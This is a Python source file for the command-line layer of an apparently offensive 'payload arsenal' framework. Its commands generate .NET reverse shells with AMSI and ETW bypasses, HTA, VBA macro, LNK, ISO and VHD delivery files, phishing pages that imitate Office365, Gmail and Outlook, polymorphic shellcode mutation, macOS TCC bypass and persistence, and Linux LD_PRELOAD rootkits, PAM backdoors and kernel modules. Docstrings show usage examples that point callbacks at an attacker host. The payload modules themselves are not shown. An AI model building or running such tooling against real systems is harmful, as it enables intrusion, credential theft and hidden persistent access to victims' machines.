"""Payload arsenal commands — dotnet, reflective DLL, staged delivery, polymorphic, macOS/Linux payloads.

Provides:
    dotnet_payload          — Generate .NET/C# payloads (reverse shell, beacon, injection, bypass)
    show dotnet_templates   — List available .NET/C# template names
    reflective_dll          — Analyze a PE/DLL for reflective loading
    staged_delivery         — Generate HTA, VBA, XLM, LNK, ISO, VHD delivery artifacts
    show staged_formats     — List available staged delivery formats
    polymorphic             — Apply polymorphic mutation to shellcode
    macos_payload           — Generate macOS .app bundles, persistence, TCC bypass
    show macos_payloads     — List available macOS payload types
    linux_advanced_payload  — Generate LD_PRELOAD rootkits, eBPF, PAM backdoors, kernel modules
    show linux_payloads     — List available Linux advanced payload types
"""

from __future__ import annotations

import cmd2

from cli.commands._base import LazyOwnCommandSet


class PayloadArsenalCommandSet(LazyOwnCommandSet):
    """Dotnet, reflective DLL, staged delivery, polymorphic, macOS/Linux advanced payloads."""

    phase = "payload"
    category = "10. Payload Arsenal"

    def do_dotnet_payload(self, line: str) -> None:
        """Generate a .NET/C# payload.

Usage: dotnet_payload <template> [LHOST=<ip>] [LPORT=<port>] [--format f] [--target exe|dll] [--platform x86|x64|AnyCPU]

Templates: reverse_tcp, http_beacon, process_injection, amsi_bypass, etw_bypass, token_impersonation

Examples:
    dotnet_payload reverse_tcp LHOST=10.0.0.1 LPORT=4444
    dotnet_payload http_beacon LHOST=10.0.0.1 LPORT=443 --format ps1
    dotnet_payload process_injection shellcode_b64=BASE64 --target exe --platform x64
"""
        from modules.dotnet_payload import DotNetPayloadFactory, DotNetPayloadConfig

        if not line.strip():
            self._cmd.perror("Usage: dotnet_payload <template> [options]")
            self._cmd.poutput("Use 'arsenal_show dotnet_templates' to list available templates.")
            return

        args = line.strip().split()
        template = args[0]

        config = DotNetPayloadConfig(template_name=template)

        for arg in args[1:]:
            if "=" in arg:
                k, v = arg.split("=", 1)
                k = k.lower()
                if k == "lhost":
                    config.lhost = v
                elif k == "lport":
                    config.lport = int(v)
                elif k == "platform":
                    config.platform = v
                elif k == "shellcode_b64":
                    config.extra_params["shellcode_b64"] = v
                else:
                    config.extra_params[k] = v
            elif arg == "--target" or arg == "--format":
                continue
            elif arg in ("--target",):
                continue

        if not config.lhost:
            config.lhost = self.params.get("lhost", "")
        if not config.lport or config.lport == 443:
            lp = self.params.get("lport", 0)
            if lp:
                config.lport = int(lp)

        for a in args:
            if a == "--target" or a == "--format":
                idx = args.index(a)
                if idx + 1 < len(args):
                    if a == "--target":
                        config.target = args[idx + 1]
                    elif a == "--format":
                        fmt = args[idx + 1]
                    break

        factory = DotNetPayloadFactory()
        result = factory.generate(config)

        self._cmd.poutput(f"\n[+] .NET/C# Payload Generated")
        self._cmd.poutput(f"    Template : {result['template']}")
        self._cmd.poutput(f"    Target   : {result['target']}")
        self._cmd.poutput(f"    Platform : {result['platform']}")

        if result.get("binary_path"):
            self._cmd.poutput(f"    Binary   : {result['binary_path']}")
        if result.get("binary_b64"):
            self._cmd.poutput(f"    B64 Size : {len(result['binary_b64'])} chars")

        fmt = "ps1"
        for i, a in enumerate(args):
            if a == "--format" and i + 1 < len(args):
                fmt = args[i + 1]

        if fmt in ("ps1", "powershell"):
            inline = factory.generate_inline_assembly(config)
            self._cmd.poutput(f"\n    [Inline Assembly Command]:\n    {inline[:400]}...")
        else:
            source = result.get("source", "")
            self._cmd.poutput(f"\n    [Source Preview]:\n{source[:500]}...")

    def do_arsenal_show(self, line: str) -> None:
        """Show payload arsenal items.

Usage: arsenal_show <category>

Categories: dotnet_templates, staged_formats, macos_payloads, linux_payloads
"""
        line = line.strip().lower()

        if line == "dotnet_templates":
            from modules.dotnet_payload import DotNetPayloadFactory
            templates = DotNetPayloadFactory.list_templates()
            self._cmd.poutput(f"\n[ .NET/C# Payload Templates — {len(templates)} available ]\n")
            for t in templates:
                self._cmd.poutput(f"    {t}")
            self._cmd.poutput("")
            return

        if line == "staged_formats":
            self._cmd.poutput(f"\n[ Staged Delivery Formats ]\n")
            for fmt in ["hta", "vba", "xlm", "lnk", "iso", "vhd"]:
                self._cmd.poutput(f"    {fmt}")
            self._cmd.poutput(f"\n[ Phishing Templates ]\n")
            for tmpl in ["office365", "gmail", "outlook"]:
                self._cmd.poutput(f"    {tmpl}")
            self._cmd.poutput("")
            return

        if line == "macos_payloads":
            from modules.macos_payloads import MacOSPayloadFactory, TCC_SERVICES, PERSISTENCE_METHODS
            self._cmd.poutput(f"\n[ macOS TCC Services — {len(TCC_SERVICES)} ]\n")
            for svc in TCC_SERVICES:
                self._cmd.poutput(f"    {svc}")
            self._cmd.poutput(f"\n[ macOS Persistence Methods — {len(PERSISTENCE_METHODS)} ]\n")
            for m in PERSISTENCE_METHODS:
                self._cmd.poutput(f"    {m}")
            self._cmd.poutput("")
            return

        if line == "linux_payloads":
            from modules.linux_advanced_payloads import LinuxAdvancedPayloadFactory
            lf = LinuxAdvancedPayloadFactory()
            self._cmd.poutput(f"\n[ Linux LD_PRELOAD Hook Functions — {len(lf.list_hook_functions())} ]\n")
            for h in lf.list_hook_functions():
                self._cmd.poutput(f"    {h}")
            self._cmd.poutput(f"\n[ Linux Persistence Methods — {len(lf.list_persistence_methods())} ]\n")
            for m in lf.list_persistence_methods():
                self._cmd.poutput(f"    {m}")
            self._cmd.poutput("")
            return

        self._cmd.poutput("arsenal_show <category>: dotnet_templates | staged_formats | macos_payloads | linux_payloads")

    def do_staged_delivery(self, line: str) -> None:
        """Generate staged delivery artifacts (HTA, VBA, LNK, ISO, VHD).

Usage: staged_delivery <format> [LHOST=<ip>] [LPORT=<port>] [--app-name "Name"]

Formats: hta, vba, xlm, lnk, iso, vhd, all
Phishing: office365, gmail, outlook

Examples:
    staged_delivery hta LHOST=10.0.0.1 LPORT=443 --app-name "QuarterlyReport"
    staged_delivery all LHOST=10.0.0.1 LPORT=8443
    staged_delivery office365 LHOST=10.0.0.1 LPORT=443
"""
        from modules.staged_delivery import StagedDeliveryFactory, StageDeliveryConfig

        if not line.strip():
            self._cmd.perror("Usage: staged_delivery <format> [options]")
            self._cmd.poutput("Use 'arsenal_show staged_formats' to list available formats.")
            return

        args = line.strip().split()
        fmt = args[0].lower()
        config = StageDeliveryConfig(format=fmt)

        for arg in args[1:]:
            if "=" in arg:
                k, v = arg.split("=", 1)
                k = k.lower()
                if k == "lhost":
                    config.lhost = v
                elif k == "lport":
                    config.lport = int(v)
            elif arg == "--app-name":
                idx = args.index(arg)
                if idx + 1 < len(args):
                    config.app_name = args[idx + 1]

        if not config.lhost:
            config.lhost = self.params.get("lhost", "")
        if not config.lport or config.lport == 443:
            lp = self.params.get("lport", 0)
            if lp:
                config.lport = int(lp)

        factory = StagedDeliveryFactory(config=config)

        if fmt in ("office365", "gmail", "outlook"):
            html = factory.generate_phishing_page(template=fmt)
            self._cmd.poutput(f"\n[+] Phishing page generated: {fmt}")
            self._cmd.poutput(f"    LHOST={config.lhost} LPORT={config.lport}")
            self._cmd.poutput(f"\n{html[:800]}...")
            return

        if fmt == "all":
            artifacts = factory.generate_all()
            self._cmd.poutput(f"\n[+] All delivery artifacts generated in {factory.output_dir}/")
            for name, info in artifacts.items():
                if isinstance(info, dict) and "path" in info:
                    self._cmd.poutput(f"    {name:8s} → {info['path']}")
            return

        if fmt == "hta":
            content = factory.generate_hta()
            self._cmd.poutput(f"\n[+] HTA generated ({len(content)} bytes)")
        elif fmt == "vba":
            content = factory.generate_vba_macro()
            self._cmd.poutput(f"\n[+] VBA macro generated ({len(content)} bytes)")
        elif fmt == "xlm":
            content = factory.generate_xlm_macro()
            self._cmd.poutput(f"\n[+] XLM macro generated ({len(content)} bytes)")
        elif fmt == "lnk":
            data = factory.generate_lnk()
            self._cmd.poutput(f"\n[+] LNK file generated ({len(data)} bytes)")
            return
        elif fmt == "iso":
            data = factory.generate_iso()
            self._cmd.poutput(f"\n[+] ISO image generated ({len(data)} bytes)")
            return
        elif fmt == "vhd":
            data = factory.generate_vhd()
            self._cmd.poutput(f"\n[+] VHD image generated ({len(data)} bytes)")
            return
        else:
            self._cmd.perror(f"Unknown format: {fmt}")
            return

        self._cmd.poutput(content[:600])
        self._cmd.poutput("...")

    def do_polymorphic(self, line: str) -> None:
        """Apply polymorphic mutation to shellcode.

Usage: polymorphic <shellcode_hex> [--passes N] [--arch x64|x86] [--nop] [--xor] [--compress] [--base64]

Examples:
    polymorphic fc4883e4f0e8c0000000415141505251564831 --passes 3
    polymorphic $(cat shellcode.hex) --passes 5 --xor --compress --base64
"""
        from modules.polymorphic_engine import PolymorphicEngine, MutationConfig

        if not line.strip():
            self._cmd.perror("Usage: polymorphic <shellcode_hex> [options]")
            return

        args = line.strip().split()
        hex_str = args[0].replace("\\x", "").replace(" ", "").replace("\n", "")

        config = MutationConfig()
        for arg in args[1:]:
            if arg == "--nop":
                config.nop_substitution = True
                config.nop_insertion = True
            elif arg == "--xor":
                config.xor_encrypt = True
            elif arg == "--compress":
                config.compress = True
            elif arg == "--base64":
                config.base64_wrap = True
            elif arg.startswith("--passes"):
                idx = args.index(arg)
                if idx + 1 < len(args):
                    config.passes = int(args[idx + 1])
            elif arg.startswith("--arch"):
                idx = args.index(arg)
                if idx + 1 < len(args):
                    arch = args[idx + 1]
                    break

        try:
            shellcode = bytes.fromhex(hex_str)
        except ValueError as e:
            self._cmd.perror(f"Invalid hex: {e}")
            return

        arch = "x64"
        for i, a in enumerate(args):
            if a == "--arch" and i + 1 < len(args):
                arch = args[i + 1]

        engine = PolymorphicEngine(config=config)
        mutated = engine.mutate(shellcode, arch=arch)

        self._cmd.poutput(f"\n[+] Polymorphic mutation complete")
        self._cmd.poutput(f"    Original  : {len(shellcode)} bytes")
        self._cmd.poutput(f"    Mutated   : {len(mutated)} bytes ({len(mutated) / max(len(shellcode), 1):.1f}x)")

        audit = engine.get_audit_summary()
        self._cmd.poutput(f"    Variants  : {audit['variants']}")
        self._cmd.poutput(f"    Entropy   : {audit['entropy_min']} → {audit['entropy_max']} (avg {audit.get('entropy_avg', '?')})")
        self._cmd.poutput(f"    Hashes    :")
        for h in audit["hashes"][-3:]:
            self._cmd.poutput(f"        {h[:32]}...")
        self._cmd.poutput(f"    Hex preview: {mutated[:64].hex()}...")

    def do_macos_payload(self, line: str) -> None:
        """Generate macOS payloads (.app bundles, persistence, TCC bypass).

Usage: macos_payload <type> [LHOST=<ip>] [LPORT=<port>] [--app-name "Name"]

Types: app_bundle, launchd, tcc_bypass, osascript, swift, all

Examples:
    macos_payload app_bundle LHOST=10.0.0.1 LPORT=4444 --app-name "SystemPreferences"
    macos_payload launchd LHOST=10.0.0.1 LPORT=8443
    macos_payload all LHOST=10.0.0.1 LPORT=4444
"""
        from modules.macos_payloads import MacOSPayloadFactory, MacOSPayloadConfig

        if not line.strip():
            self._cmd.perror("Usage: macos_payload <type> [options]")
            return

        args = line.strip().split()
        ptype = args[0].lower()
        config = MacOSPayloadConfig()

        for arg in args[1:]:
            if "=" in arg:
                k, v = arg.split("=", 1)
                k = k.lower()
                if k == "lhost":
                    config.lhost = v
                elif k == "lport":
                    config.lport = int(v)
            elif arg == "--app-name":
                idx = args.index(arg)
                if idx + 1 < len(args):
                    config.app_name = args[idx + 1]

        if not config.lhost:
            config.lhost = self.params.get("lhost", "")
        if not config.lport or config.lport == 443:
            lp = self.params.get("lport", 0)
            if lp:
                config.lport = int(lp)

        factory = MacOSPayloadFactory(config=config)

        if ptype == "all":
            artifacts = factory.generate_all()
            self._cmd.poutput(f"\n[+] All macOS payloads generated in {factory.output_dir}/")
            for name, info in artifacts.items():
                if isinstance(info, (str, Path)):
                    self._cmd.poutput(f"    {name:25s} → {info}")
            return

        if ptype == "app_bundle":
            path = factory.generate_app_bundle()
            self._cmd.poutput(f"\n[+] .app bundle generated: {path}")
        elif ptype == "launchd":
            result = factory.generate_launchd_persistence()
            self._cmd.poutput(f"\n[+] LaunchD persistence generated:")
            self._cmd.poutput(f"    plist : {result['plist_path']}")
            self._cmd.poutput(f"    script: {result['script_path']}")
        elif ptype == "tcc_bypass":
            script = factory.generate_tcc_bypass()
            self._cmd.poutput(f"\n[+] TCC bypass script:\n{script[:600]}")
        elif ptype == "osascript":
            script = factory.generate_osascript_dropper()
            self._cmd.poutput(f"\n[+] osascript dropper:\n{script[:500]}")
        elif ptype == "swift":
            source = factory.generate_swift_stager()
            self._cmd.poutput(f"\n[+] Swift stager source:\n{source[:500]}")
        else:
            self._cmd.perror(f"Unknown macOS payload type: {ptype}")
            self._cmd.poutput("Types: app_bundle, launchd, tcc_bypass, osascript, swift, all")

    def do_linux_advanced_payload(self, line: str) -> None:
        """Generate advanced Linux payloads (LD_PRELOAD, eBPF, PAM, kernel module).

Usage: linux_advanced_payload <type> [LHOST=<ip>] [LPORT=<port>]

Types: ld_preload, ebpf, pam_backdoor, systemd, ssh, kernel_module, motd, udev, all

Examples:
    linux_advanced_payload ld_preload LHOST=10.0.0.1 LPORT=4444 --hook accept
    linux_advanced_payload pam_backdoor LHOST=10.0.0.1 LPORT=8443
    linux_advanced_payload all LHOST=10.0.0.1 LPORT=4444
"""
        from modules.linux_advanced_payloads import LinuxAdvancedPayloadFactory, LinuxAdvancedConfig

        if not line.strip():
            self._cmd.perror("Usage: linux_advanced_payload <type> [options]")
            return

        args = line.strip().split()
        ptype = args[0].lower()
        config = LinuxAdvancedConfig()

        for arg in args[1:]:
            if "=" in arg:
                k, v = arg.split("=", 1)
                k = k.lower()
                if k == "lhost":
                    config.lhost = v
                elif k == "lport":
                    config.lport = int(v)
            elif arg.startswith("--hook"):
                idx = args.index(arg)
                if idx + 1 < len(args):
                    config.hook_function = args[idx + 1]

        if not config.lhost:
            config.lhost = self.params.get("lhost", "")
        if not config.lport or config.lport == 443:
            lp = self.params.get("lport", 0)
            if lp:
                config.lport = int(lp)

        factory = LinuxAdvancedPayloadFactory(config=config)

        if ptype == "all":
            artifacts = factory.generate_all()
            self._cmd.poutput(f"\n[+] All Linux payloads generated in {factory.output_dir}/")
            for name, info in artifacts.items():
                if isinstance(info, (str, Path)):
                    self._cmd.poutput(f"    {name:30s} → {info}")
            return

        if ptype == "ld_preload":
            src = factory.generate_ld_preload_rootkit()
            self._cmd.poutput(f"\n[+] LD_PRELOAD rootkit generated ({len(src)} bytes C source)")
            binary = factory.compile_c_source(src, "ld_preload_rootkit", shared=True)
            self._cmd.poutput(f"    Binary: {binary}" if binary else "    Binary: gcc not available (source only)")
        elif ptype == "ebpf":
            src = factory.generate_ebpf_payload()
            self._cmd.poutput(f"\n[+] eBPF payload generated ({len(src)} bytes)")
        elif ptype == "pam_backdoor":
            src = factory.generate_pam_backdoor()
            self._cmd.poutput(f"\n[+] PAM backdoor generated ({len(src)} bytes C source)")
            binary = factory.compile_c_source(src, "pam_backdoor", shared=True)
            self._cmd.poutput(f"    Binary: {binary}" if binary else "    Binary: gcc -lpam not available")
        elif ptype == "systemd":
            result = factory.generate_systemd_persistence()
            self._cmd.poutput(f"\n[+] SystemD persistence generated:")
            self._cmd.poutput(f"    Service: {result['service_name']}")
            self._cmd.poutput(f"    Install: {result['install_cmd']}")
        elif ptype == "ssh":
            script = factory.generate_ssh_persistence()
            self._cmd.poutput(f"\n[+] SSH persistence script ({len(script)} bytes)")
        elif ptype == "kernel_module":
            src = factory.generate_kernel_module()
            self._cmd.poutput(f"\n[+] Kernel module source ({len(src)} bytes)")
        elif ptype == "motd":
            script = factory.generate_motd_backdoor()
            self._cmd.poutput(f"\n[+] MOTD backdoor ({len(script)} bytes)")
        elif ptype == "udev":
            rule = factory.generate_udev_persistence()
            self._cmd.poutput(f"\n[+] Udev rule:\n{rule}")
        else:
            self._cmd.perror(f"Unknown Linux payload type: {ptype}")
            self._cmd.poutput("Types: ld_preload, ebpf, pam_backdoor, systemd, ssh, kernel_module, motd, udev, all")


from pathlib import Path
